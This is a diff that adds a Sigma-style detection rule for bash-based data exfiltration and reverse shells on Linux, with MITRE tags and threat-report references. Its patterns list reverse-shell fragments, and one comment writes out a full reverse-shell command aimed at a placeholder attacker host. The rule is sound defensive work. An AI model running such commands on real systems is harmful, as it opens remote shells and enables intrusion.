@@ -1,0 +1,53 @@
+id: MMIcrE3TvsKZ
+name: Possible Data Exfiltration / Reverse Shell via Bash (via cmdline)
+body: |-
+  title: Possible Data Exfiltration / Reverse Shell via Bash (via cmdline)
+  id: e4b95599-8caf-41d4-b0a9-26478d133904
+  status: stable
+  description: Send local file in the body of an HTTP POST request or using a TCP connection or actions to establish a reverse shell.
+  author: SOC Prime Team
+  references:
+      - https://hunt.io/blog/ukraine-state-data-exchange-graylog-log4shell
+      - https://www.huntress.com/blog/php2shell-leaked-critical-php-vulnerabilities
+      - https://unit42.paloaltonetworks.com/ai-campaign-targets-linux-infrastructure/
+      - https://unit42.paloaltonetworks.com/modern-kubernetes-threats/
+      - https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-022a
+      - https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-249a
+      - https://gtfobins.github.io/gtfobins/bash/
+      - https://www.intel471.com/blog/cve-2026-1731-finding-a-critical-rce-in-an-age-of-ai-driven-vulnerability-research
+  tags:
+      - attack.exfiltration
+      - attack.t1048.001
+      - attack.execution
+      - attack.t1059.004
+      - attack.command_and_control
+      - attack.t1095
+  logsource:
+      category: process_creation
+      product: linux
+  detection:
+      selection:
+          Image|endswith: 'sh' #bash/sh/zsh etc.
+      selection_vars:
+          - CommandLine|contains|all:
+              - '/dev/tcp/'
+              - 'HTTP'
+          - CommandLine|contains|all:
+              - '/dev/tcp/' # https://unit42.paloaltonetworks.com/ai-campaign-targets-linux-infrastructure/
+              - '0>&1'
+      selection_revshell:
+          CommandLine|contains:
+              - '>& /dev/udp/'
+              - '>& /dev/tcp/'
+              - '<>/dev/tcp/'
+              - '<>/dev/udp/'
+              - 'bash -i >&' #/bin/bash -i >& /dev/tcp/attacker-ip/port 0>&1; https://www.intel471.com/blog/cve-2026-1731-finding-a-critical-rce-in-an-age-of-ai-driven-vulnerability-research
+      filters:
+          Image|endswith: '/docker'
+      condition: ((selection and selection_vars) or selection_revshell) and not filters
+  falsepositives:
+      - Trubleshooting activity.
+  level: high
+level: high
+created: '2020-03-20T10:21:28Z'
+updated: '2026-10-21T14:31:04.460000Z'
